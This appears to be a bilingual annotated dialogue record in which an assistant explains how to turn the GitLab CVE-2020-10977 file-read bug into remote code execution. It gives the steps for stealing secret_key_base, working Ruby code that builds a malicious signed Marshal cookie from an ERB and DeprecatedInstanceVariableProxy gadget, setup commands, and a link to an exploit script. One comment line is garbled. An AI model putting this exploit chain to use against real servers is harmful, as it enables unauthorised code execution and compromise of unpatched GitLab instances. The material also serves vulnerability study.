title.zh: GitLab CVE-2020-10977 任意文件读取导致的远程代码执行
title.en: GitLab CVE-2020-10977 RCE via Arbitrary File Read

description.zh: 通过 CVE-2020-10977 读取 secret_key_base 后，利用反序列化漏洞伪造 Cookie 实现 RCE
description.en: Exploit CVE-2020-10977 to read secret_key_base, then use deserialization vulnerability to forge Cookie for RCE

content.zh: 分析 GitLab CVE-2020-10977 如何导致 RCE
content.en: Analyze how GitLab CVE-2020-10977 leads to RCE

annotation.zh: 用户询问文件读取漏洞如何升级为 RCE
annotation.en: User asks how file read vulnerability escalates to RCE

codeBlocks.code:
$ /opt/gitlab/embedded/bin/runsvdir-start &
$ gitlab-ctl reconfigure
$ vi /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
# 鏇挎崲secret_key_base涓烘湇鍔?鍙楀绔殑secret_key_base
$ gitlab-rails console

# /opt/gitlab/embedded/service/gitlab-rails/config/initializers/cookies_serializer.rb
# Be sure to restart your server when you modify this file.

Rails.application.config.action_dispatch.use_cookies_with_metadata = false
Rails.application.config.action_dispatch.cookies_serializer = :hybrid

content.zh: CVE-2020-10977 本身是文件读取漏洞，但可以通过读取敏感文件进一步实现 RCE。影响版本为 GitLab CE/EE >=8.5 且 < 12.9。攻击链为：1) 利用文件读取漏洞获取 /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml 中的 secret_key_base；2) 使用该密钥生成恶意的序列化 Cookie；3) 发送恶意 Cookie 触发反序列化执行命令。
content.en: CVE-2020-10977 itself is a file read vulnerability, but can escalate to RCE by reading sensitive files. Affected versions are GitLab CE/EE >=8.5 and < 12.9. Attack chain: 1) Use file read vulnerability to get secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml; 2) Use the key to generate malicious serialized Cookie; 3) Send malicious Cookie to trigger deserialization command execution.

annotation.zh: 助手解释从文件读到 RCE 的攻击链
annotation.en: Assistant explains attack chain from file read to RCE

annotation.zh: 用户询问利用工具的使用
annotation.en: User asks about exploit tool usage

content.zh: 需要先搭建与目标相同版本的 GitLab 环境。步骤：1) 拉取相同版本镜像：docker pull gitlab/gitlab-ee:12.8.1-ee.0；2) 启动容器并进入 console；3) 修改 secrets.yml 文件，将 secret_key_base 替换为目标服务器的值；4) 使用 gitlab-rails console 执行 Ruby 代码生成 ERB 模板对象，包装成 ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy 对象；5) 将该对象序列化为 Cookie 值；6) 使用 curl 发送 Cookie 到目标服务器触发命令执行。
content.en: Need to set up same version GitLab environment. Steps: 1) Pull same version image: docker pull gitlab/gitlab-ee:12.8.1-ee.0; 2) Start container and enter console; 3) Modify secrets.yml file, replace secret_key_base with target server's value; 4) Use gitlab-rails console to execute Ruby code generating ERB template object, wrapped as ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy object; 5) Serialize the object as Cookie value; 6) Use curl to send Cookie to target server to trigger command execution.

annotation.zh: 助手详细说明 Cookie 生成步骤

content.zh:
Ruby 代码示例：
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `echo from CVE-2020-10977 > /tmp/flags` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
content.en:
Ruby code example:
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `echo from CVE-2020-10977 > /tmp/flags` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]

annotation.zh: 展示生成恶意 Cookie 的 Ruby 代码
annotation.en: Show Ruby code for generating malicious Cookie

content.zh: 这个漏洞的原理是什么？
content.en: What is the principle behind this vulnerability?

annotation.zh: 用户询问代码层面的漏洞原理
annotation.en: User asks about code-level vulnerability principle

content.zh: 关键在于 config/initializers/cookies_serializer.rb 文件中配置的 cookies_serializer = :hybrid。这个配置允许反序列化 marshal 格式的 Cookie。当攻击者获得了 secret_key_base 后，可以签名任意的序列化对象。通过构造 ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy 对象包装 ERB 模板，当 GitLab 反序列化这个 Cookie 时，会触发 ERB 模板的 result 方法执行任意命令。这与 Shiro 反序列化漏洞的利用方式类似。
content.en: The key is cookies_serializer = :hybrid configured in config/initializers/cookies_serializer.rb file. This configuration allows deserialization of marshal format Cookies. When attacker obtains secret_key_base, they can sign arbitrary serialized objects. By constructing ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy object wrapping ERB template, when GitLab deserializes this Cookie, it triggers ERB template's result method to execute arbitrary commands. This is similar to Shiro deserialization vulnerability exploitation.

annotation.zh: 助手深入分析反序列化漏洞原理
annotation.en: Assistant analyzes deserialization vulnerability principle in depth

content.zh: 参考链接：HackerOne 报告 (https://hackerone.com/reports/827052)、Cookie 生成脚本 (https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Gitlab/CVE-2020-10977)
content.en: References: HackerOne report (https://hackerone.com/reports/827052), Cookie generation script (https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Gitlab/CVE-2020-10977)
